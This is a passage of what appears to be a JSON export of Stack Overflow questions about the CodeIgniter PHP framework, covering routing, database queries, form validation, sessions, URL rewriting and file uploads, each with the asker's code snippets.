class=\"lightfont\"&gt;&lt;/span&gt;\n</code></pre>\n\n<p>and this my model: </p>\n\n<pre><code>function general(){\n\n    $data['content_category'] = array(\n        \"Dramas\"=&gt;\"Dramas\",\n        \"Movies\"=&gt;\"Movies\",\n        \"News\"=&gt;\"News\",\n        \"Anime\"=&gt;\"Anime\",\n        \"Popular Selection\"=&gt;\"Popular Selection\"\n    );\n\n    $data['content_channel'] = array(\n        \"China\"=&gt;\"China\",\n        \"Hong Kong\"=&gt;\"Hong Kong\",\n        \"Taiwan\"=&gt;\"Taiwan\",\n        \"Japan\"=&gt;\"Japan\",\n        \"Korea\"=&gt;\"Korea\",\n        \"UK\"=&gt;\"UK\",\n        \"US\"=&gt;\"US\",\n        \"Indonesia\"=&gt;\"Indonesia\"\n    );\n\n\n    $data['content_language'] = array(\n        \"English\"=&gt;\"English\",\n        \"Chinese\"=&gt;\"Chinese\",\n        \"Others\"=&gt;\"Others\"\n    );\n\n    return $data;\n}\n\n\nfunction sample_data(){\n\n    $TVContent ['China']['Chinese']['Movies'][1]= array ('title'=&gt;'Gooddrama','home-index-china movies', 'English', 'Grey');\n    $TVContent ['China']['Chinese']['Drama'][2]= array ('title'=&gt;'Gooddrama','home-index-china drama', 'English', 'Grey');\n    $TVContent ['China']['English']['Sport'][3]= array ('title'=&gt;'ABO','', 'English', 'Grey');\n    $TVContent ['China']['Chinese']['News'][4]= array ('title'=&gt;'KTD','', 'Chinese', 'Grey');\n\n    $TVContent ['China']['Chinese']['Movies'][1]['title'];\n}\n</code></pre>\n"},{"tags":["php","codeigniter","dompdf","fgetcsv"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12572831,"title":"DomPDF Codeigniter charset not correctly rendered","body":"<p>I have a nifty problem with DomPDF, it does bug-up accented characters.\nI did everything that Phil Sturgeon suggests on <a href=\"http://philsturgeon.co.uk/blog/2009/08/UTF-8-support-for-CodeIgniter\" rel=\"nofollow\">Phil Sturgeon on UTF-8 support for Codeigniter</a> \nBut with the only result that the first page of the PDF is okay but the rest is wrong.</p>\n\n<p>Anyone any suggestions or solutions?</p>\n\n<p>B.t.w. I import through a csv-file with PHP fgetcsv(), my php-array looks good.</p>\n"},{"tags":["javascript","jquery","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1337,"score":2,"question_id":6529427,"title":"calling a codeigniter controller method from jquery","body":"<p>I wanted to call a codeigniter controller method from within jquery \nas of now I am trying something like this but it isn't working could anyone help me out with this</p>\n\n<pre><code>$.ajax({type: \"POST\", url:\"site/controller/method/\",\n\n                  success: function(){\n                      alert(\"success\");\n                  },\n\n                  error: function(xhr, textStatus, error){\n                              alert(xhr.statusText);\n                              alert(textStatus);\n                              alert(error);\n                          }\n\n               });\n</code></pre>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":12593741,"title":"Insert a foreign key values in mysql (codeigniter)","body":"<p>hey guys i have a little problem. All i want is to insert a foreign key values in my table.\nHere’s my create table statement in mysql.</p>\n\n<pre><code>CREATE TABLE `sales` (\n `sales_id` INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,\n `fkmember` INT(10) UNSIGNED NOT NULL,\n `date_of_sales` DATETIME NOT NULL,\n PRIMARY KEY (`sales_id`),\n INDEX `fkmember` (`fkmember`),\n CONSTRAINT `sales_ibfk_1` FOREIGN KEY (`fkmember`) REFERENCES `member` (`member_id`)\n)\nCOLLATE='utf8_general_ci'\nENGINE=InnoDB\nAUTO_INCREMENT=3;\n\n\nCREATE TABLE `sales_line` (\n `line_id` INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,\n `fkproduct` INT(10) UNSIGNED NOT NULL,\n `fksales` INT(10) UNSIGNED NOT NULL,\n `quantity_purchased` INT(10) UNSIGNED NOT NULL,\n `subtotal` FLOAT(7,2) UNSIGNED NOT NULL,\n PRIMARY KEY (`line_id`),\n INDEX `fkproduct` (`fkproduct`),\n INDEX `fksales` (`fksales`),\n CONSTRAINT `sales_line_ibfk_1` FOREIGN KEY (`fkproduct`) REFERENCES `product` (`product_id`),\n CONSTRAINT `sales_line_ibfk_2` FOREIGN KEY (`fksales`) REFERENCES `sales` (`sales_id`)\n) \n</code></pre>\n\n<p>my table structure:</p>\n\n<p>sales table\nsales_id   |  fkmember   |  date_of_sales   |</p>\n\n<p>sales_line table\nline_id   |  fkproduct   |  fksales   |  quantity_purchased   |  subtotal   |</p>\n\n<p>my code in inserting the values in two tables:</p>\n\n<pre><code>foreach($products as $p){\n        $data = array(\n            'sales_id' =&gt; null,\n            'fkmember' =&gt; $memberid\n            'name' =&gt; $p['product_name']\n        );\n        $this-&gt;db-&gt;insert('sales',$data);\n    }\n   foreach($products as $p){\n        $data = array(\n            'line_id' =&gt; null,\n            'fk_product' =&gt; $p['id'],\n            'fk_sales' =&gt; null,\n            'quantity_purchased' =&gt; $p['product_qty'],\n            'subtotal' =&gt; number_format($subtotal,2)\n        );\n        $this-&gt;db-&gt;insert('sales_line',$data);\n    }\n    } \n</code></pre>\n\n<p>i know i have an error in inserting values in inserting values in fk_sales.\nHow can i insert a value in this field that comes from the id of my sales table?\nBecause i want to insert these two tables in one round. Please Help Me Guys. Thanks</p>\n"},{"tags":["php","codeigniter","amazon-product-api"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":66,"score":3,"question_id":12519922,"title":"Accuracy with Amazon Product API and multiple potential categories","body":"<p>i'm using codeigniter alongside this Amazon ECS class — <a href=\"https://github.com/Exeu/Amazon-ECS-PHP-Library\" rel=\"nofollow\">https://github.com/Exeu/Amazon-ECS-PHP-Library</a></p>\n\n<p>the problem i'm running into is that people could put any number of things in to our app that i'd like amazon to be trolled to match. it could be a quote from a book, a lyric from a song, a soliloquy from a TV series, etc.</p>\n\n<p>yet there is no way of knowing which one of these various categories to shoot off to with the class. from what i can tell from googling and trial/error'ing you can only choose one category . i'm doing it like so:</p>\n\n<pre><code>$amzn = $this-&gt;ecs-&gt;category('Books')-&gt;responseGroup('Small,Images')-&gt;optionalParameters(array('author'=&gt;$chunk['author']))-&gt;search($chunk['source']);\n</code></pre>\n\n<p>the further issue is that the data i have—author and source—could be an actual author, a character from a movie, a musician/band, a book, a tv series, an album or song, etc.</p>\n\n<p>so my question: is there a way to just dump a group of variables within a context (but larger than singular, ie 'Books')? if i could drop the author and the source in I think my chances of finding the most accurate result would be better off.</p>\n\n<p>if not, then what's the best alternative? just run the query on all three categories and then compare the results?</p>\n\n<p>halp! thanks!</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12593307,"title":"Paging configuration per user","body":"<p>I use paging in Codeigniter, and I would like to display by default 15 records per page. However, I would like to give the user option to choose how many records per page he would like to see, selecting from the dropdown 30, 50, 100 or all records.</p>\n\n<p>Since I will have this code on more than one place, I would like to avoid repeating same code trough my controllers. Anyone know which is right way how to implement this option according to MVC philosophy? Should this code be placed in some config file?</p>\n"},{"tags":["php","validation","forms","codeigniter"],"answer_count":3,"favorite_count":5,"up_vote_count":9,"down_vote_count":0,"view_count":5487,"score":9,"question_id":2802046,"title":"Codeigniter Form Validation - how to unset form values after success?","body":"<p>I realise this request goes against the example provided in the CI documentation (which advises a separate 'success' page view), but I would like to reutilise a given form view after a form has been successfully submitted - displaying a success message then displaying a blank form. I've tried a few ways unsuccessfully to clear the validation set values (unsetting $_POST, setting rules / fields to an empty array and rerunning validation).  </p>\n\n<p>I could redirect to the same page, but then I'd have to set a session variable to display a success message - which is a messy approach.</p>\n\n<p>Any ideas how to best achieve the above?</p>\n"},{"tags":["php","codeigniter","form-validation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12591947,"title":"set_rules() not co-operating","body":"<p>This is something wack, when set_rules is told to look for <code>current_password</code> it doesn't work yet when it's told to look for <code>current-password</code> it does.</p>\n\n<pre><code>&lt;input type=\"password\" name=\"current_password\" id=\"current_password\" value=\"\"/&gt;\n</code></pre>\n\n<p>Note that both name and id have an underscore.</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('current_password', 'Password', 'required|callback_check_password['.$user_id.']');\n//This gives me\nUnable to access an error message corresponding to your field name.\n</code></pre>\n\n<p>The above rule wont work, yet if I change it too <code>set_rules('current-password'</code> it starts shows the error message.</p>\n\n<p>Printing error messages with <code>&lt;?php echo validation_errors(); ?&gt;</code></p>\n\n<p>Doing a dump of post shows <code>array(1) { [\"current_password\"]=&gt; string(4) \"test\" }</code></p>\n"},{"tags":["php","codeigniter","hmvc"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12586125,"title":"CodeIgniter HMVC extends MX_Controller, unable to use get_instance properly","body":"<p>I have a controller in /application/core</p>\n\n<p><strong>/application/core/CMS_Controller.php</strong></p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nrequire APPPATH.\"third_party/MX/Controller.php\";\n\nclass CMS_Controller extends MX_Controller {\n\n    public function __construct() {\n        parent::__construct();\n    }\n\n    public function show_something() {\n        echo \"something shown\";\n    }\n} \n</code></pre>\n\n<p>I have another controller in a module (/modules/my_module/controllers/controller.php) which extended from CMS_Controller</p>\n\n<p><strong>/modules/my_module/controllers/controller.php</strong></p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Controller extends CMS_Controller {\n\n    public function index() {\n        $this-&gt;load-&gt;view('view');\n    }\n} \n</code></pre>\n\n<p>And, in view.php (/modules/my_module/views/view.php) I do this:\n<strong>/modules/my_module/views/view.php</strong></p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n $ci =&amp; get_instance();\n echo $ci-&gt;show_something();\n?&gt; \n</code></pre>\n\n<p>And I get this error:</p>\n\n<blockquote>\n  <p>Fatal error: Call to undefined method CI::show_something() in\n  /home/gofrendi/public_html/No-CMS/modules/my_module/views/view.php on\n  line 3</p>\n</blockquote>\n\n<p>It will works if I don’t use MX_Controller and using CI_Controller instead:\n<strong>/application/core/CMS_Controller.php</strong></p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\n//require APPPATH.\"third_party/MX/Controller.php\";\n\nclass CMS_Controller extends CI_Controller {\n\n    public function __construct() {\n        parent::__construct();\n    }\n\n    public function show_something() {\n        echo \"something shown\";\n    }\n} \n</code></pre>\n\n<p>Anybody know what’s wrong here?</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12586218,"title":"Codeigniter get database records when number of selected field is unknown","body":"<p>I have a form field, with around 40 checkboxes. When users ticks checkboxes, depending upon the checked checkbox, the fields from database is selected. So, they can check all or any of them to show what fields in the report. I have made successful sql query and it executes well. All i m having problem is looping through the record set and populating the html table because I m unknown what columns they selected to show. I m trying to sorting out the issue, but nothing is coming in my head right now. Any help will be highly appreciated. I just need an idea! I m using the query method of the codeigniter-</p>\n\n<pre><code>$query=$this-&gt;db-&gt;query($sql);\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["codeigniter","function","upsert"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12575792,"title":"CodeIgniter: My upsert function not working with my_model / my_controller","body":"<p>Working with the my_model &amp; my_controller for the first time this month within CodeIgniter, I think I almost have this working.</p>\n\n<p>I got an insert function working properly, now I'm trying to add an update to it if there is an ID.</p>\n\n<p>Here's my code:</p>\n\n<pre><code>function upsert_client($client_id = 0)\n{\n    load_model('client_model');\n    $this-&gt;insertMethodJS();\n\n    $this-&gt;fields['client'] = $this-&gt;_prototype_client();\n\n    $user_id = get_user_id();\n    $company_id = get_company_id();\n\n    if ($client_id)\n    {\n        $this-&gt;data['client'] = $this-&gt;client_model-&gt;get_record($client_id);\n    }   \n\n\n\n    if (!$this-&gt;ion_auth-&gt;in_group(GROUP_NAME_MANAGER, $user_id))\n    {\n        redirect('members/dashboard');\n    }\n\n    if ($_POST)\n    {\n        $this-&gt;load-&gt;helper('string');  \n\n        if ($this-&gt;_validate_client())\n        {   \n\n        $fields = $this-&gt;input-&gt;post(null , TRUE);\n        $fields['user_id'] = $user_id;\n        $fields['company_id'] = $company_id;\n        $fields['active'] = 1;\n\n            if ($client_id)\n            {\n            $fields['id'] = $this-&gt;client_model-&gt;get_record($client_id);    \n            unset($fields['billing']);\n            $this-&gt;client_model-&gt;update($client_id, $fields);       \n            }\n\n            else \n            {\n            unset($fields['billing']);\n            $this-&gt;client_model-&gt;insert($fields);\n            redirect('members/clients/manage_clients');\n            }\n\n        }\n    }\n\n    $this-&gt;template-&gt;write_view('content',$this-&gt;base_path.'/'.build_view_path(__METHOD__), $this-&gt;data);           \n    $this-&gt;template-&gt;render();\n}\n\n\n\nfunction _prototype_client()\n{\n    $fields = array();\n\n    $fields['id']   = 0;\n    $fields['name'] = '';           \n\n    return $fields;\n}\n</code></pre>\n\n<p>And from my client_model:</p>\n\n<pre><code>class Client_model extends MY_Model {\n\nfunction get_record($client_id)\n{\n\n    $query = $this-&gt;db-&gt;select('id')\n    -&gt;where(array('id'=&gt;$client_id))\n    -&gt;get('clients');\n    return $query-&gt;row_array();\n}\n</code></pre>\n\n<p>}</p>\n\n<p>Everytime I try to edit a \"client\", it just inserts a new one... All I'm currently trying to edit is the \"name\" field.</p>\n\n<p>My edit button:</p>\n\n<pre><code>&lt;td&gt;&lt;a href=\"add_client/&lt;?= $client-&gt;id; ?&gt;\"&gt;&lt;button class=\"btn btn-inverse\" style=\"float: right;\" type=\"button\"&gt;Edit&lt;/button&gt;&lt;/a&gt;&lt;/td&gt;\n</code></pre>\n\n<p>Any help is appreciated, thanks! And let me know if you need any additional details...</p>\n"},{"tags":["php","class","codeigniter","fatal-error"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12590506,"title":"undefined method despite method being defined","body":"<p>Having a very strange issue with an error on a codeigniter site.</p>\n\n<pre><code>Fatal error: Call to undefined method Document::get_by_module()\n</code></pre>\n\n<p>The line of code causing this (in a controller) is:</p>\n\n<pre><code>$this-&gt;document_type-&gt;get_by_module('module1');\n</code></pre>\n\n<p>The constructor of the controller:</p>\n\n<pre><code>function __construct(){\n    parent::__construct();\n    $this-&gt;load-&gt;model('document','document_type');\n}\n</code></pre>\n\n<p>The document_type class looks like this</p>\n\n<pre><code>class Document_type extends CI_Model {\n    function Document_type () {\n        parent::__construct();\n\n    }       \n    function get_by_module($prefix) {\n        // code \n    }\n}\n</code></pre>\n\n<p>The main issue I'm seeing is that it's saying <code>Document::</code> is the class, but it should be <code>Document_type</code>. I see no reason that it should be looking in the document class for that function. </p>\n\n<p>If I remove loading of the 'document' class from the controller constructor, the error goes away (but other things break).</p>\n\n<p>Not sure how something like that could be happening.</p>\n"},{"tags":["codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12590502,"title":"How to retrieve $config['myConfig_array'] in Code Igniter","body":"<p>I've followed <a href=\"http://stackoverflow.com/questions/2222558/codeigniter-language#comment7969872_2223001\">Codeigniter language</a> and all seems to be setup as a hook.</p>\n\n<pre><code>function pick_language() {\n\n    require_once(APPPATH.'/config/language.php');\n\n    session_start();\n\n    // Lang set in URL via ?lang=something\n    if(!empty($_GET['lang']))\n    {\n        // Turn en-gb into en\n        $lang = substr($_GET['lang'], 0, 2);\n        $_SESSION['lang_code'] = $lang;\n    }\n\n    // Lang has already been set and is stored in a session\n    elseif( !empty($_SESSION['lang_code']) )\n    {\n        $lang = $_SESSION['lang_code'];\n    }\n\n    // Lang has is picked by a user.\n    // Set it to a session variable so we are only checking one place most of the time\n    elseif( !empty($_COOKIE['lang_code']) )\n    {\n        $lang = $_SESSION['lang_code'] = $_COOKIE['lang_code'];\n    }\n\n    // Still no Lang. Lets try some browser detection then\n    else if (!empty( $_SERVER['HTTP_ACCEPT_LANGUAGE'] ))\n    {\n        // explode languages into array\n        $accept_langs = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);\n\n        log_message('debug', 'Checking browser languages: '.implode(', ', $accept_langs));\n\n        // Check them all, until we find a match\n        foreach ($accept_langs as $lang)\n        {\n            // Turn en-gb into en\n            $lang = substr($lang, 0, 2);\n\n            // Check its in the array. If so, break the loop, we have one!\n            if(in_array($lang, array_keys($config['supported_languages'])))\n            {\n                break;\n            }\n        }\n    }\n\n    // If no language has been worked out - or it is not supported - use the default\n    if(empty($lang) or !in_array($lang, array_keys($config['supported_languages'])))\n    {\n        $lang = $config['default_language'];\n    }\n\n    // Whatever we decided the lang was, save it for next time to avoid working it out again\n    $_SESSION['lang_code'] = $lang;\n\n    // Load CI config class\n    $CI_config =&amp; load_class('Config');\n\n    // Set the language config. Selects the folder name from its key of 'en'\n    $CI_config-&gt;set_item('language', $config['supported_languages'][$lang]['folder']);\n\n    // Sets a constant to use throughout ALL of CI.\n    define('CURRENT_LANGUAGE', $lang);\n}\n</code></pre>\n\n<p>Now when I try to access $config['supported_languages'] it returns null or errors. Why?</p>\n"}]}
{"total":13987,"page":15,"pagesize":100,"questions":[{"tags":["codeigniter"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":375,"score":2,"question_id":5203581,"title":"CodeIgniter - removing index.php","body":"<p>Im having some trouble removing the index.php thing on my CI install, the current .htaccess im using is as follows:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\n\n#Removes access to the system folder by users.\n#Additionally this will allow you to create a System.php controller,\n#previously this would not have been possible.\n#'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#When your application folder isn't in the system folder\n#This snippet prevents user access to the application folder\n#Submitted by: Fabdrol\n#Rename 'application' to your applications folder name.\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#Checks to see if the user is attempting to access a valid file,\n#such as an image or css document, if this isn't true it sends the\n#request to index.php\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n&lt;IfModule !mod_rewrite.c&gt;\nErrorDocument 404 /index.php\n&lt;/IfModule&gt; \n</code></pre>\n\n<p>My CI install is back from the public_html directory and i have changed the config to</p>\n\n<pre><code>$config['index_page'] = \"\";\n</code></pre>\n\n<p>So my CI looks like the following</p>\n\n<pre><code>/core-1.7.3\n/public_html/index.php\n</code></pre>\n\n<p>When i type the url i get the 404, but when i put index.php in front of it, it works fine :S</p>\n\n<p>Im confused</p>\n"},{"tags":["php","sql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12586828,"title":"Mistake in my CodeIgniter sql join query","body":"<p>So I have been lookin for mistake for a while, but still can't find it.</p>\n\n<p>Here is the code - </p>\n\n<pre><code>        $this-&gt;db-&gt;select('*');\n        $this-&gt;db-&gt;from('friendRequests');\n        $this-&gt;db-&gt;where(array('friendRequests.status' =&gt; 1, 'users.status' =&gt; 1)); \n        $this-&gt;db-&gt;or_where(array('friendRequests.senderId' =&gt; $this-&gt;session-&gt;userdata('userId'), 'friendRequests.receiverId' =&gt; $this-&gt;session-&gt;userdata('userId'))); \n        $this-&gt;db-&gt;join('users', 'users.id = '.$this-&gt;session-&gt;userdata('userId'));             \n        $query = $this-&gt;db-&gt;get();\n</code></pre>\n\n<p>It provides me this error - </p>\n\n<pre><code>Unknown column '1' in 'on clause'\n\nSELECT *\n  FROM (`friendRequests`) \n  JOIN `users` ON `users`.`id` = `1`\n WHERE `friendRequests`.`status` = 1\n   AND `users`.`status` = 1 \n    OR `friendRequests`.`senderId` = '1' \n    OR `friendRequests`.`receiverId` = '1'\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12576005,"title":"CodeIgniter query result is returning array as $user['0']->name. How can i get it as $user->name?","body":"<p>Model function</p>\n\n<pre><code>public function getUserByID($id) \n    {\n        $q = $this-&gt;db-&gt;get_where('users', array('id' =&gt; $id), 1);\n        $user= $q-&gt;result();\n        if($user) {\n        return $user;\n        } else {\n        return false;\n        }\n    }\n</code></pre>\n\n<p>Controller code</p>\n\n<pre><code>$data['user'] = $this-&gt;users_model-&gt;getUserByID($id);\n</code></pre>\n\n<p>View file code</p>\n\n<pre><code>&lt;pre&gt;&lt;?php print_r($user); ?&gt;&lt;/pre&gt;\n\nArray\n(\n    [0] =&gt; stdClass Object\n        (\n            [id] =&gt; 1\n            [name] =&gt; Saleem\n            [city] =&gt; Kuala Lumput\n            [state] =&gt; WP\n            [postal_code] =&gt; 58100\n            [country] =&gt; Malaysia\n            [phone] =&gt; 0123456789\n\n        )\n)\n</code></pre>\n\n<p>How can i get the result as below.</p>\n\n<pre><code>Array\n(\n            [id] =&gt; 1\n            [name] =&gt; Saleem\n            [city] =&gt; Kuala Lumput\n            [state] =&gt; WP\n            [postal_code] =&gt; 58100\n            [country] =&gt; Malaysia\n            [phone] =&gt; 0123456789\n)\n</code></pre>\n\n<p>as now I need to use it as $user['0']->name; I want to use it as $user->name; Please help me</p>\n"},{"tags":["codeigniter","codeigniter-url"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12581381,"title":"Get parameter from url in codeigniter?","body":"<p>My url is: localhost/school/DPC\nIn the above url <strong>school</strong> is my controller class and <strong>DPC</strong> is the school name. I want to get the name <strong>DPC</strong> from the url in the <strong>school</strong> controller class.</p>\n\n<p>In routes.php page i have used \n    $route['default_controller'] = \"school\";\nNow what i have to do such that i can get the school name from the url.</p>\n\n<p>Thanks in advanced.</p>\n"},{"tags":["php","oop","class","codeigniter","properties"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":280,"score":1,"question_id":7027615,"title":"Accessing Class Properties with Spaces","body":"<p><code>stdClass Object ([Sector] =&gt; Manufacturing [Date Found] =&gt; 2010-05-03 08:15:19)</code></p>\n\n<p>So I can access <code>[Sector]</code> by using <code>$object-&gt;Sector</code> but how can I access <code>[Date Found]</code> ?</p>\n"},{"tags":["php","iis","codeigniter","web-config","codeigniter-2"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":2836,"score":0,"question_id":5408111,"title":"Codeigniter 2 on IIS with web.config file","body":"<p>I have a codeigniter app working fine locally with WAMP. However, I am having trouble getting it to work on an IIS server. Please note that I do not want to enable query strings.</p>\n\n<p>Here is what I currently have in my web.config file:</p>\n\n<pre><code>    &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n    &lt;system.webServer&gt;\n        &lt;rewrite&gt;\n            &lt;rules&gt;\n                &lt;rule name=\"Clean URL\" stopProcessing=\"true\"&gt;\n                    &lt;match url=\"^(.*)$\" /&gt;\n                    &lt;conditions&gt;\n                        &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" negate=\"true\" /&gt;\n                        &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsDirectory\" negate=\"true\" /&gt;\n                    &lt;/conditions&gt;\n                    &lt;action type=\"Rewrite\" url=\"index.php/{R:1}\" appendQueryString=\"false\" /&gt;\n                &lt;/rule&gt;\n            &lt;/rules&gt;\n        &lt;/rewrite&gt;\n    &lt;/system.webServer&gt;\n&lt;/configuration&gt;  \n</code></pre>\n\n<p>This causes the main page to load properly: www.website.com/policies</p>\n\n<p>However, when I click on an item to go to: www.website.com/policies/policy/view/31</p>\n\n<p>The proper page is not displayed. The main page continues to be displayed.</p>\n\n<p>The controller is Policy and the function is view(). The Codeigniter files are in a policies/ folder on the server.</p>\n\n<p>I think the problem may be with my web.config file. The Config file's $config['base_url'] is dynamically calculated and is the correct one. The Config file's $config['index_page'] is blank. What do you think is causing this problem?</p>\n\n<p>Thank you all for your help.</p>\n"},{"tags":["php","codeigniter","url","parameters","uri"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12573758,"title":"in codeigniter how can i get uri segments by name?","body":"<p>I have the latest codeigniter version, and was wondering how can i get the segments in a url by their parameter name.  For instance, here is a sample url:</p>\n\n<pre><code>www.somewebsitedomain.com/param1=something/param2=somethingelse/\n</code></pre>\n\n<p>now lets say i want to get the value for 'param1', which is 'something', how would i do so using the uri class?</p>\n\n<p>Because by default the uri class only gets segments by number, or the order in which they appear, but i want to get segments by the parameter name in that segment.  Or in general just get the parameter value.  Hope that makes sense...</p>\n"},{"tags":["codeigniter","session"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":925,"score":0,"question_id":9471104,"title":"Codeigniter native session or ci session library","body":"<p>Im building a really small social site about sports.</p>\n\n<p>And i would like to ask a more experienced developer, if it would be better to use native session or ci session library? and if ci library it it better to use the databse store?</p>\n\n<p>Thank you for your options</p>\n"},{"tags":["codeigniter","tankauth"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":210,"score":1,"question_id":7759184,"title":"Customizing Tank_Auth table field names for CodeIgniter","body":"<p>I am a beginner learning codeigniter to build a website. For authentication feature, i use tank_auth library and it works fine if I dont alter the tank_auth table field names.</p>\n\n<p>Then, to combine the tank_auth's 'users' table with my existing 'users_info' table, I modified the field names 'new_email_key' and 'username' as NewEmailKey and UserName respectively.</p>\n\n<p>The above specified field name changes were done in libraries\\Tank_auth.php, models\\tank_auth\\users.php and controllers\\auth.php files.</p>\n\n<p>In the database, the submitted data are stored right in the table. But in the activation email received, i am getting the following errors:</p>\n\n<blockquote>\n  <p>Message: Undefined variable: username</p>\n  \n  <p>Filename: email/activate-html.php</p>\n  \n  <p>Message: Undefined variable: new_email_key</p>\n  \n  <p>Filename: email/activate-html.php</p>\n</blockquote>\n\n<p>Is it safe to use the tank_auth table field names as it is in our CI projects?</p>\n\n<p>Is there any clear documentation written on how to customize and use the tank_auth 'users' table field names?</p>\n\n<p>I am stuck with these error messages as i dont figure out where else the field names need to be altered in tank_auth. </p>\n\n<p>Any help appreciated.</p>\n"},{"tags":["php","codeigniter","file-upload"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":545,"score":4,"question_id":9996596,"title":"Strange Issue with Video File Upload in CodeIgniter","body":"<p>I am building a video site on CodeIgniter (v 2.1.0). The admins can upload videos via admin panel. It works perfectly on my local server. But on remote test server, it's not working. I have set the mimes.php to recognize the file-type correctly. The allowed file-types are okay. But the error message says the file-type isn't permitted.\nHere's my mimes.php:</p>\n\n<pre><code>...\n'mp4'  =&gt; 'video/mp4',\n'flv'  =&gt; 'video/x-flv',\n'avi' =&gt; 'video/x-msvideo',\n'mpeg' =&gt; 'video/mpeg',\n...\n</code></pre>\n\n<p>Alowed file-types:</p>\n\n<pre><code>$upload_config['allowed_types'] = 'flv|mp4|avi|mpeg'\n</code></pre>\n\n<p>Upload library is initialised with <code>$this-&gt;upload-&gt;initialize($upload_config);</code> If I do a var_dump for $_FILES it gives me:</p>\n\n<pre><code>array(1) { [\"video_file\"]=&gt; array(5) { [\"name\"]=&gt; string(48) \"test_video_file.mp4\" [\"type\"]=&gt; string(9) \"video/mp4\" [\"tmp_name\"]=&gt; string(14) \"/tmp/phpwkOICI\" [\"error\"]=&gt; int(0) [\"size\"]=&gt; int(5668643) } } \n</code></pre>\n\n<p>What is wrong with it? What drives me nuts is that the same script works fine on my local machine but doesn't work on remote test sub-domain. And every debug message looks legit to me. Any help is much appreciated.\nThanks and regards</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12580076,"title":"Multidimensional Array To Mysql Codeigniter","body":"<p>A little help how can I create an input query using this array? Or how \n   can I pass it in the table? my table layout sample is this:</p>\n\n<p>sales_table</p>\n\n<pre><code> id   |   product_name   |   price   |   qty   |   subtotal       \n</code></pre>\n\n<p>This is derived from the var_dump() function.<br>\nHere is my code in array</p>\n\n<pre><code>//array code from unserialized function\n    $products = unserialize($this-&gt;session-&gt;userdata('product_list'));\n\n//This is the output.\nArray\n(\n    [2] =&gt; Array\n        (\n            [id] =&gt; 2\n            [product_name] =&gt; NOKIA 5110\n            [product_desc] =&gt; Cellphone\n            [product_price] =&gt; 500.00\n            [product_qty] =&gt; 1\n            [product_amount] =&gt; 500\n            [product_code] =&gt; NOKI2012-84353\n        )\n\n    [3] =&gt; Array\n        (\n            [id] =&gt; 3\n            [product_name] =&gt; HP IPAQ RW6828\n            [product_desc] =&gt; Cellphone\n            [product_price] =&gt; 1500.00\n            [product_qty] =&gt; 1\n            [product_amount] =&gt; 1500\n            [product_code] =&gt; HP I2012-08386\n        )\n)\n</code></pre>\n"},{"tags":["php","codeigniter","image-manipulation"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":2986,"score":0,"question_id":3325106,"title":"how to crop image in codeigniter?","body":"<p>i'm using codeigniter to build a project and right now i need to create a thumb depending on user choice. like he will give me 